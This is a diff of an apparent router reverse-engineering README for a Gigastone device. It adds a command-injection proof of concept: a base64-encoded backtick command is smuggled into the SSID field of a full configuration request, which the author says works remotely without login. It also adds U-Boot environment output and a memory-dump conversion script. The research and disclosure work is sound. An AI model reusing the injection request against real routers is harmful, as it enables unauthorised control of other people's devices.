@@ -13,14 +13,21 @@ Gigastone is a electronics brand based in Taiwan.
 After logging in with the default credentials, I watched network traffic from dev tools while setting the SSID.
 It seems the device uses `tr1.cgi?cgi=2` for configuration.
 The device uses base64 to send the SSID.
+
+![image](https://github.com/skyler-ferrante/Gigastone-RE/assets/24577503/4b1597ec-1484-4e59-98e0-f050da488c68)
+
 This field has command injection, and we can use the new SSID as the commands output.
 
-SSID is set to base64 of string `` `echo hi` `` (`YGVjaG8gaGlgCg==`)
+SSID is set to base64 of string `` `echo command injection` `` (`YGVjaG8gY29tbWFuZCBpbmplY3Rpb25gCg==`)
 ```
-http://<ROUTER_IP>/cgi-bin/tr1.cgi?cgi=2&mode=0&ssid=YGVjaG8gaGlgCg==&ht=0&channel=0&dhcp=50&static=0&ip=0.0.0.0&subnet=0.0.0.0&gw=0.0.0.0&pppmode=0&pppusr=bnVsbA==&ppppwd=bnVsbA==&pwd=
+http://<ROUTER_IP>/cgi-bin/tr1.cgi?cgi=2&mode=0&ssid=YGVjaG8gY29tbWFuZCBpbmplY3Rpb25gCg==&ht=0&channel=0&dhcp=50&static=0&ip=0.0.0.0&subnet=0.0.0.0&gw=0.0.0.0&pppmode=0&pppusr=bnVsbA==&ppppwd=bnVsbA==&pwd=
 ```
 
-This seems to be hittable from a remote IP.
+This API seems to be hittable from a remote IP, when not logged in (even with default password changed).
+
+![image](https://github.com/skyler-ferrante/Gigastone-RE/assets/24577503/4346f60e-8f03-4636-a46f-ae87b2d0490c)
+
+![image](https://github.com/skyler-ferrante/Gigastone-RE/assets/24577503/b886fa58-2fd6-488c-8a4e-b212a7ff1b4d)
 
 # Hardware/Serial
 
@@ -113,4 +120,48 @@ setenv  - set environment variables
 tftpboot- boot image via network using TFTP protocol
 version - print monitor version
 TR1>
+TR1> printenv
+bootargs=console=ttyS0,115200 root=31:02 rootfstype=squashfs init=/sbin/init mtdparts=ar7240-nor0:256k(u-boot),64k(u-boot-env),2752k(rootfs),896k(uImage),64k(NVRAM),64k(ART)
+bootcmd=bootm 0x9f300000
+bootdelay=1
+baudrate=115200
+ethaddr=0x00:0xaa:0xbb:0xcc:0xdd:0xee
+ipaddr=192.168.16.254
+serverip=192.168.16.10
+stdin=serial
+stdout=serial
+stderr=serial
+ethact=eth0
+nc=setenv stdin nc;setenv stdout nc;setenv stderr serial
+serial=setenv stdin serial;setenv stdout serial;setenv stderr serial
+ncip=192.168.16.10
+```
+
+From here we can dump memory with `md`, and convert it into raw binary. I personally like to use python, with a quick script like below.
+```
+#!/bin/python3
+
+import sys
+
+if len(sys.argv) != 2:
+    print("GIVE ME FILE NOW")
+    sys.exit(1)
+
+with open(sys.argv[1]) as open_file:
+    with open("output.bin", "wb") as out_file:
+        for line in open_file:
+            line = line.strip()
+
+            tokens = line.split(" ")
+            byte_str = ''.join(tokens[1:6])
+            print(byte_str)
+
+            print(tokens)
+            byte_o = bytes.fromhex(byte_str)
+            out_file.write(byte_o)
+```
+
+From memory address `0x9f300000` to `0x9f3dd320` there seems to be a Linux Kernel Image.
+```
+output.bin: u-boot legacy uImage, Linux Kernel Image, Linux/MIPS, OS Kernel Image (lzma), 905965 bytes, Wed Feb 26 04:14:51 2014, Load Address: 0x80002000, Entry Point: 0x801EA0E0, Header CRC: 0x0F2D2E50, Data CRC: 0x85246A37
 ```
